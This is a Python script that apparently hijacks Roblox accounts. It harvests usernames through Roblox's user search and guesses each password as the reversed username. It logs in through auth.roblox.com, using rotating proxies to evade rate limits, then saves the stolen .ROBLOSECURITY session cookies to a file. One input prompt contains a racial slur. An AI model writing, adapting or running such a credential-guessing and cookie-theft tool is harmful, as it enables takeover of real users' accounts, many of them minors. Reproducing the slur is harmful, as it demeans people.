import random
import re
from socket import timeout
import requests
import json
import threading

proxye = open("proxies.txt").read()
f = open("namelist.json")
data = json.loads(f.read())
question = str(input("only accounts with numbers in name? yes or no: "))

if question == "yes":
    numbs = True
if question == "no":
    numbs = False
question = str(input("proxies yes or no: "))

if question == "yes":

    proxiees = True

if question == "no":

    proxiees = False
threads = int(input("how many threads nigga: "))


def getrandname():
    randomname1 = random.choice(data["first"])
    randomname2 = random.choice(data["last"])
    randomname = randomname1 + randomname2
    return randomname


def getbot():
    while True:
        try:
            randomname = getrandname()
            resp = requests.get(
                "https://www.roblox.com/search/users/results?maxRows=100&keyword="
                + randomname
            )
            if resp.json()["UserSearchResults"]:
                for user in resp.json()["UserSearchResults"]:
                    if user["Name"] and user["Name"].lower().find(randomname):
                        if numbs == True and not any(i.isdigit() for i in user["Name"]):
                            print("numnotfound")
                            continue
                        print(user["Name"] + " password: " + user["Name"][::-1])
                        with open("uncheckeduserpass.txt", "a") as file:
                            file.write(user["Name"] + ":" + user["Name"][::-1] + "\n")
                        threading.Thread(
                            target=checkacc(user["Name"], user["Name"][::-1])
                        ).start()
        except:
            print("error")


def checkacc(
    name, passs
):  # really messy code i know i cba to tidy it up because it doesnt work for me anyways because my proxies are shit :skull:
    try:
        session = requests.Session()

        proxyee = proxye.splitlines()
        ex = random.choice(proxyee)
        proxy = {"http": ex, "https": ex}

        if proxiees == True:
            xthingtokenfuck = session.post(
                f"https://auth.roblox.com/v2/signup", proxies=proxy
            ).headers["x-csrf-token"]
        else:
            xthingtokenfuck = session.post(
                f"https://auth.roblox.com/v2/signup"
            ).headers["x-csrf-token"]
        headers = {
            "x-csrf-token": xthingtokenfuck,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "User-Agent": "Chrome",
        }
        ex = random.choice(proxyee)
        proxy = {"http": ex, "https": ex}
        data = {"ctype": "Username", "cvalue": name, "password": passs}
        data = str(data)
        if proxiees == True:
            response = session.post(
                "https://auth.roblox.com/v2/login",
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=50,
            )
        else:
            response = session.post(
                "https://auth.roblox.com/v2/login", headers=headers, data=data
            )
        print(response.json())
        cookie = session.cookies[".ROBLOSECURITY"]
        with open("cookies.txt", "a") as file:
            file.write(cookie + "\n")
    except Exception as err:
        print(err)


for i in range(threads):
    x = threading.Thread(target=getbot)
    x.start()
